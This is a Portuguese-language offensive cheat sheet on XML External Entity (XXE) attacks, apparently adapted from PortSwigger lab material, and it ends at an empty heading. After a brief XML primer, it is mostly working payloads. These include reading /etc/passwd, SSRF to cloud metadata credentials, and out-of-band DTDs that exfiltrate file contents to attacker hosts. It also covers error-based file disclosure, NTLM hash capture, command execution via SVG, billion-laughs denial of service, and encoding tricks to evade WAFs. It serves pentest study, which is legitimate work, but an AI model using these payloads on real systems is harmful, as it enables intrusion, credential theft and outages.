Um ataque de Entidade Externa XML (XXE) é um tipo de ataque contra um aplicativo que analisa entrada XML.

## Conceitos básicos de XML

**A maior parte desta seção foi retirada desta página incrível da Portswigger:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### O que é XML? <a href="#what-is-xml" id="what-is-xml"></a>

XML significa "extensible markup language". XML é uma linguagem projetada para armazenar e transportar dados. Como o HTML, o XML usa uma estrutura em forma de árvore de tags e dados. Ao contrário do HTML, o XML não usa tags predefinidas, e as tags podem receber nomes que descrevem os dados. No início da história da web, o XML estava na moda como formato de transporte de dados (o "X" em "AJAX" significa "XML"). Mas sua popularidade agora diminuiu em favor do formato JSON.

### O que são entidades XML? <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>

As entidades XML são uma maneira de representar um item de dados dentro de um documento XML, em vez de usar os dados em si. Várias entidades são incorporadas à especificação da linguagem XML. Por exemplo, as entidades `&lt;` e `&gt;` representam os caracteres `<` e `>`. Esses são metacaracteres usados para denotar tags XML e, portanto, geralmente devem ser representados usando suas entidades quando aparecem dentro de dados.

### O que são elementos XML?

As declarações de tipo de elemento definem as regras para o tipo e número de elementos que podem aparecer em um documento XML, quais elementos podem aparecer dentro de outros e em que ordem devem aparecer. Por exemplo:

* `<!ELEMENT stockCheck ANY>` Significa que qualquer objeto pode estar dentro do pai `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck EMPTY> Significa que deve estar vazio `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck (productId,storeId)> Declara que `<stockCheck>` pode ter os filhos `<productId>` e `<storeId>`

### O que é a definição de tipo de documento? <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>

A definição de tipo de documento XML (DTD) contém declarações que podem definir a estrutura de um documento XML, os tipos de valores de dados que ele pode conter e outros itens. A DTD é declarada dentro do elemento `DOCTYPE` opcional no início do documento XML. A DTD pode ser totalmente autocontida dentro do próprio documento (conhecida como "DTD interna") ou pode ser carregada de outro lugar (conhecida como "DTD externa") ou pode ser híbrida das duas.

### O que são entidades personalizadas XML? <a href="#what-are-xml-custom-entities" id="what-are-xml-custom-entities"></a>

O XML permite que entidades personalizadas sejam definidas dentro da DTD. Por exemplo:

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

Essa definição significa que qualquer uso da referência de entidade `&myentity;` dentro do documento XML será substituído pelo valor definido: "`my entity value`".

### O que são entidades externas XML? <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>

As entidades externas XML são um tipo de entidade personalizada cuja definição está localizada fora da DTD onde são declaradas.

A declaração de uma entidade externa usa a palavra-chave `SYSTEM` e deve especificar uma URL da qual o valor da entidade deve ser carregado. Por exemplo:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

A URL pode usar o protocolo `file://`, e as entidades externas podem ser carregadas a partir de um arquivo. Por exemplo:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

As entidades externas XML fornecem o principal meio pelo qual surgem os ataques de [entidade externa XML (XXE)](https://portswigger.net/web-security/xxe).

### O que são entidades de parâmetro XML?

Às vezes, ataques XXE usando entidades regulares são bloqueados, devido a alguma validação de entrada pela aplicação ou alguma proteção do analisador XML que está sendo usado. Nessa situação, você pode ser capaz de usar entidades de parâmetro XML em vez disso. As entidades de parâmetro XML são um tipo especial de entidade XML que só pode ser referenciada em outro lugar dentro da DTD. Para fins presentes, você só precisa saber duas coisas. Primeiro, a declaração de uma entidade de parâmetro XML inclui o caractere de porcentagem antes do nome da entidade:

`<!ENTITY % myparameterentity "my parameter entity value" >`

E segundo, as entidades de parâmetro são referenciadas usando o caractere de porcentagem em vez do e comercial usual: `%myparameterentity;`

Isso significa que você pode testar o XXE cego usando detecção fora de banda via entidades de parâmetro XML da seguinte maneira:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

Esta carga útil XXE declara uma entidade de parâmetro XML chamada `xxe` e, em seguida, usa a entidade dentro da DTD. Isso causará uma pesquisa DNS e uma solicitação HTTP ao domínio do atacante, verificando que o ataque foi bem-sucedido.

## Principais ataques

[A maioria desses ataques foi testada usando os incríveis laboratórios XEE da Portswiggers: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

### Novo teste de entidade

Neste ataque, vou testar se uma simples nova declaração de ENTIDADE está funcionando.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
    <productId>&toreplace;</productId>
    <storeId>1</storeId>
</stockCheck>
```
### Ler arquivo

Vamos tentar ler o arquivo `/etc/passwd` de diferentes maneiras. Para o Windows, você pode tentar ler: `C:\windows\system32\drivers\etc\hosts`

Neste primeiro caso, observe que SYSTEM "_\*\*file:///\*\*etc/passwd_" também funcionará.
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
Este segundo caso pode ser útil para extrair um arquivo se o servidor web estiver usando PHP (não é o caso dos laboratórios Portswiggers).
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Neste terceiro caso, observe que estamos declarando o `Element stockCheck` como ANY.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&file;</productId>
    <storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Listagem de diretórios

Em aplicações baseadas em **Java**, pode ser possível **listar o conteúdo de um diretório** via XXE com um payload como este (apenas solicitando o diretório em vez do arquivo):
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Um XXE pode ser usado para abusar de um SSRF dentro de uma nuvem.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

Usando a **técnica comentada anteriormente** você pode fazer o servidor acessar um servidor que você controla para mostrar que ele é vulnerável. Mas, se isso não estiver funcionando, talvez seja porque **as entidades XML não são permitidas**, nesse caso você pode tentar usar **entidades de parâmetros XML**:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### SSRF "Cego" - Exfiltrar dados fora de banda

**Nesta ocasião, vamos fazer com que o servidor carregue um novo DTD com uma carga maliciosa que enviará o conteúdo de um arquivo via solicitação HTTP (para arquivos de várias linhas, você pode tentar exfiltrá-lo via** _**ftp://**_**). Esta explicação foi retirada do** [**laboratório Portswiggers aqui**](https://portswigger.net/web-security/xxe/blind)**.**

Um exemplo de um DTD malicioso para exfiltrar o conteúdo do arquivo `/etc/hostname` é o seguinte:
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Esta DTD realiza os seguintes passos:

* Define uma entidade de parâmetro XML chamada `file`, contendo o conteúdo do arquivo `/etc/passwd`.
* Define uma entidade de parâmetro XML chamada `eval`, contendo uma declaração dinâmica de outra entidade de parâmetro XML chamada `exfiltrate`. A entidade `exfiltrate` será avaliada fazendo uma solicitação HTTP ao servidor web do atacante contendo o valor da entidade `file` dentro da string de consulta da URL.
* Usa a entidade `eval`, o que faz com que a declaração dinâmica da entidade `exfiltrate` seja executada.
* Usa a entidade `exfiltrate`, para que seu valor seja avaliado solicitando a URL especificada.

O atacante deve então hospedar a DTD maliciosa em um sistema que ele controle, normalmente carregando-a em seu próprio servidor web. Por exemplo, o atacante pode servir a DTD maliciosa na seguinte URL:\
`http://web-attacker.com/malicious.dtd`

Finalmente, o atacante deve enviar a seguinte carga XXE para a aplicação vulnerável:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Este payload XXE declara uma entidade de parâmetro XML chamada `xxe` e, em seguida, usa a entidade dentro do DTD. Isso fará com que o analisador XML busque o DTD externo no servidor do atacante e o interprete inline. As etapas definidas dentro do DTD malicioso são então executadas e o arquivo `/etc/passwd` é transmitido para o servidor do atacante.

### Baseado em Erro (DTD Externo)

**Neste caso, vamos fazer com que o servidor carregue um DTD malicioso que mostrará o conteúdo de um arquivo dentro de uma mensagem de erro (isso só é válido se você puder ver mensagens de erro).** [**Exemplo daqui.**](https://portswigger.net/web-security/xxe/blind)

Você pode acionar uma mensagem de erro de análise XML contendo o conteúdo do arquivo `/etc/passwd` usando um DTD externo malicioso da seguinte maneira:
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Esta DTD realiza os seguintes passos:

* Define uma entidade de parâmetro XML chamada `file`, contendo o conteúdo do arquivo `/etc/passwd`.
* Define uma entidade de parâmetro XML chamada `eval`, contendo uma declaração dinâmica de outra entidade de parâmetro XML chamada `error`. A entidade `error` será avaliada carregando um arquivo inexistente cujo nome contém o valor da entidade `file`.
* Usa a entidade `eval`, o que faz com que a declaração dinâmica da entidade `error` seja executada.
* Usa a entidade `error`, de modo que seu valor seja avaliado tentando carregar o arquivo inexistente, resultando em uma mensagem de erro contendo o nome do arquivo inexistente, que é o conteúdo do arquivo `/etc/passwd`.

Chame o erro DTD externo com:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
E você deve ver o conteúdo do arquivo dentro da mensagem de erro da resposta do servidor web.

![](<../.gitbook/assets/image (223) (1).png>)

_**Observe que o DTD externo nos permite incluir uma entidade dentro da segunda (****`eval`****), mas é proibido no DTD interno. Portanto, você não pode forçar um erro sem usar um DTD externo (geralmente).**_

### **Baseado em erro (DTD do sistema)**

E quanto às vulnerabilidades cegas XXE quando as interações **fora de banda são bloqueadas** (conexões externas não estão disponíveis)? [Informações daqui](https://portswigger.net/web-security/xxe/blind).

Nessa situação, ainda pode ser possível **disparar mensagens de erro contendo dados sensíveis**, devido a uma brecha na especificação da linguagem XML. Se o DTD de um documento usa uma **combinação de declarações DTD internas e externas**, então o **DTD interno pode redefinir entidades que são declaradas no DTD externo**. Quando isso acontece, a restrição de usar uma entidade de parâmetro XML dentro da definição de outra entidade de parâmetro é relaxada.

Isso significa que um atacante pode empregar a técnica XXE baseada em erro de dentro de um DTD interno, desde que a entidade de parâmetro XML que eles usam esteja **redefinindo uma entidade que é declarada dentro de um DTD externo**. Claro, se as conexões fora de banda estiverem bloqueadas, o DTD externo não pode ser carregado de um local remoto. Em vez disso, ele precisa ser um **arquivo DTD externo que esteja local no servidor de aplicativos**. _Essencialmente, o ataque envolve invocar um arquivo DTD que acontece de existir no sistema de arquivos local e reutilizá-lo para redefinir uma entidade existente de uma maneira que dispara um erro de análise contendo dados sensíveis._

Por exemplo, suponha que haja um arquivo DTD no sistema de arquivos do servidor no local `/usr/local/app/schema.dtd`, e este arquivo DTD define uma entidade chamada `custom_entity`. Um atacante pode disparar uma mensagem de erro de análise XML contendo o conteúdo do arquivo `/etc/passwd` enviando um DTD híbrido como o seguinte:
```markup
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```
Esta DTD realiza os seguintes passos:

* Define uma entidade de parâmetro XML chamada `local_dtd`, contendo o conteúdo do arquivo DTD externo que existe no sistema de arquivos do servidor.
* Redefine a entidade de parâmetro XML chamada `custom_entity`, que já está definida no arquivo DTD externo. A entidade é redefinida como contendo o [exploit XXE baseado em erro](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) que já foi descrito, para disparar uma mensagem de erro contendo o conteúdo do arquivo `/etc/passwd`.
* Usa a entidade `local_dtd`, para que o DTD externo seja interpretado, incluindo o valor redefinido da entidade `custom_entity`. Isso resulta na mensagem de erro desejada.

    **Exemplo do mundo real:** Sistemas que usam o ambiente de desktop GNOME frequentemente têm um DTD em `/usr/share/yelp/dtd/docbookx.dtd` contendo uma entidade chamada `ISOamso`.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Como essa técnica usa um **DTD interno, você precisa encontrar um válido primeiro**. Você pode fazer isso **instalando** o mesmo **SO / Software** que o servidor está usando e **procurando alguns DTDs padrão**, ou **obtendo uma lista** de **DTDs padrão** dentro dos sistemas e **verificando** se algum deles existe:
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
### Encontrando DTDs dentro do sistema

No seguinte repositório incrível do Github, você pode encontrar **caminhos de DTDs que podem estar presentes no sistema**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Além disso, se você tiver a **imagem Docker do sistema da vítima**, você pode usar a ferramenta do mesmo repositório para **escanear** a **imagem** e **encontrar** o caminho dos **DTDs** presentes dentro do sistema. Leia o [Readme do Github](https://github.com/GoSecure/dtd-finder) para aprender como fazer isso.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

 [=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

 [=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Analisadores de Office Open XML

(Mencionado [**aqui**](https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/))\
Muitas aplicações web permitem que você faça upload de documentos do Microsoft Office e, em seguida, analisam alguns detalhes deles. Por exemplo, você pode ter uma aplicação web que permite importar dados fazendo upload de uma planilha no formato XLSX. Em algum momento, para que o analisador extraia os dados da planilha, o analisador precisará **analisar pelo menos um arquivo XML**.

A única maneira de testar isso é gerar um **arquivo do Microsoft Office que contenha uma carga útil XXE**, então vamos fazer isso. Primeiro, crie um diretório vazio para descompactar o documento e descompacte-o!
```
test$ ls
test.docx
test$ mkdir unzipped
test$ unzip ./test.docx -d ./unzipped/
Archive:  ./test.docx
  inflating: ./unzipped/word/numbering.xml
  inflating: ./unzipped/word/settings.xml
  inflating: ./unzipped/word/fontTable.xml
  inflating: ./unzipped/word/styles.xml
  inflating: ./unzipped/word/document.xml
  inflating: ./unzipped/word/_rels/document.xml.rels
  inflating: ./unzipped/_rels/.rels
  inflating: ./unzipped/word/theme/theme1.xml
  inflating: ./unzipped/[Content_Types].xml
```
Abra o arquivo `./unzipped/word/document.xml` no seu editor de texto favorito (vim) e edite o **XML para incluir sua carga útil XXE favorita**. A primeira coisa que eu tento geralmente é uma solicitação HTTP, como esta:
```
<!DOCTYPE x [ <!ENTITY test SYSTEM "http://[ID].burpcollaborator.net/"> ]>
<x>&test;</x>
```
Essas linhas devem ser inseridas entre os dois objetos XML raiz, como este exemplo, e é claro que você precisará substituir a URL por uma URL que possa monitorar as solicitações:

![Essas linhas devem ser inseridas entre os dois objetos XML raiz, como este exemplo](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png)

Tudo o que resta é **compactar o arquivo para criar seu arquivo malicioso poc.docx**. A partir do diretório "descompactado" que criamos anteriormente, execute o seguinte:

![A partir do diretório "descompactado" que criamos anteriormente, execute o seguinte:](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png)

Agora, faça upload do arquivo para sua aplicação web (esperançosamente) vulnerável e reze para os deuses do hacking por uma solicitação em seus logs do Burp Collaborator.

### Protocolo Jar

O protocolo `jar` está disponível apenas em **aplicações Java**. Ele permite acessar arquivos dentro de um arquivo **PKZIP** (`.zip`, `.jar`, ...) e funciona para arquivos locais e remotos:
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Ser capaz de acessar arquivos dentro de arquivos PKZIP é **super útil para abusar do XXE via arquivos DTD do sistema.** Verifique [esta seção para aprender como abusar de arquivos DTD do sistema](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

#### Por trás das cenas

1. Ele faz uma solicitação HTTP para carregar o arquivo zip. `https://download.host.com/myarchive.zip`
2. Ele salva a resposta HTTP em uma localização temporária. `/tmp/...`
3. Ele extrai o arquivo.
4. Ele lê o `file.zip`
5. Ele exclui arquivos temporários.

Observe que é possível interromper o fluxo na segunda etapa. O truque é nunca fechar a conexão ao servir o arquivo. [Esta ferramenta pode ser útil](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution): uma em python `slow_http_server.py` e outra em java `slowserver.jar`.

Depois que o servidor baixou seu arquivo, você precisa encontrar sua localização navegando no diretório temporário. Sendo aleatório, o caminho do arquivo não pode ser previsto com antecedência.

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
Escrever arquivos em um diretório temporário pode ajudar a **escalar outra vulnerabilidade que envolve uma travessia de caminho** (como inclusão de arquivo local, injeção de modelo, RCE XSLT, desserialização, etc).
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Ataque de Bilhões de Risadas
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Ataque Yaml
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Ataque de Explosão Quadrática

![](<../.gitbook/assets/image (531).png>)

#### Obtendo NTML

Em hosts Windows, é possível obter o hash NTML do usuário do servidor web definindo um manipulador responder.py:
```
Responder.py -I eth0 -v
```
e enviando a seguinte solicitação
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Superfícies XXE Ocultas

### XInclude

[A partir daqui.](https://portswigger.net/web-security/xxe)

Algumas aplicações **recebem dados enviados pelo cliente, incorporam-nos no lado do servidor em um documento XML e, em seguida, analisam o documento**. Um exemplo disso ocorre quando os dados enviados pelo cliente são colocados em uma **solicitação SOAP de backend**, que é então processada pelo serviço SOAP de backend.

Nessa situação, você não pode realizar um ataque XXE clássico, porque **não controla todo o XML** e, portanto, não pode definir ou modificar um elemento `DOCTYPE`. No entanto, você pode ser capaz de usar `XInclude` em vez disso. `XInclude` é uma parte da especificação XML que permite que um documento XML seja construído a partir de subdocumentos. Você pode colocar um ataque `XInclude` em qualquer valor de dados em um documento XML, portanto, o ataque pode ser realizado em situações em que você controla apenas um único item de dados que é colocado em um documento XML do lado do servidor.

Para realizar um ataque `XInclude`, você precisa fazer referência ao namespace `XInclude` e fornecer o caminho para o arquivo que deseja incluir. Por exemplo:
```markup
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
### SVG - Upload de Arquivo

[Daqui.](https://portswigger.net/web-security/xxe)

Algumas aplicações permitem que os usuários façam upload de arquivos que são processados ​​no lado do servidor. Alguns formatos de arquivo comuns usam XML ou contêm subcomponentes XML. Exemplos de formatos baseados em XML são formatos de documentos de escritório como DOCX e formatos de imagem como SVG.

Por exemplo, uma aplicação pode permitir que os usuários **façam upload de imagens** e processem ou validem essas imagens no servidor após o upload. Mesmo que a aplicação espere receber um formato como PNG ou JPEG, a **biblioteca de processamento de imagem que está sendo usada pode suportar imagens SVG**. Como o formato SVG usa XML, um atacante pode enviar uma imagem SVG maliciosa e, assim, alcançar uma superfície de ataque oculta para vulnerabilidades XXE.
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Você também pode tentar **executar comandos** usando o wrapper "expect" do PHP:
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```
**Observação: A primeira linha do arquivo lido ou do resultado da execução aparecerá DENTRO da imagem criada. Portanto, você precisa ser capaz de acessar a imagem que o SVG criou.**

### **PDF - Upload de arquivo**

Leia o seguinte post para **aprender como explorar um XXE fazendo upload de um arquivo PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: De x-www-urlencoded para XML

Se uma solicitação POST aceita os dados no formato XML, você pode tentar explorar um XXE nessa solicitação. Por exemplo, se uma solicitação normal contém o seguinte:
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Então você pode ser capaz de enviar a seguinte solicitação, com o mesmo resultado:
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: De JSON para XEE

Para alterar a requisição, você pode usar uma extensão do Burp chamada "**Content Type Converter**". [Aqui](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) você pode encontrar um exemplo disso:
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
  "firstName": "Avinash",
  "lastName": "",
  "country": "United States",
  "city": "ddd",
  "postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]> 
<root>
 <root>
  <firstName>&xxe;</firstName>
  <lastName/>
  <country>United States</country>
  <city>ddd</city>
  <postalCode>ddd</postalCode>
 </root>
</root>
```
Outro exemplo pode ser encontrado [aqui](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF e Bypasses de Proteções

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Isso só funciona se o servidor XML aceitar o protocolo `data://`.

### UTF-7

Você pode usar a \[**"Receita de Codificação**" do CyberChef aqui ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) para transformar em UTF-7.
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Bypass do Protocolo File:/

Se o site estiver usando PHP, em vez de usar `file:/`, você pode usar **envolvedores php** `php://filter/convert.base64-encode/resource=` para **acessar arquivos internos**.

Se o site estiver usando Java, você pode verificar o [**protocolo jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### Entidades HTML

Truque de [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Você pode criar uma **entidade dentro de uma entidade** codificando-a com **entidades HTML** e depois chamá-la para **carregar um dtd**.\
Observe que as **Entidades HTML** usadas precisam ser **numéricas** (como \[neste exemplo]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
    <env>&exfil;</env>
</data>
```
Exemplo de DTD:
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## Invólucros PHP

### Base64

**Extrair** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Extrair recurso externo**
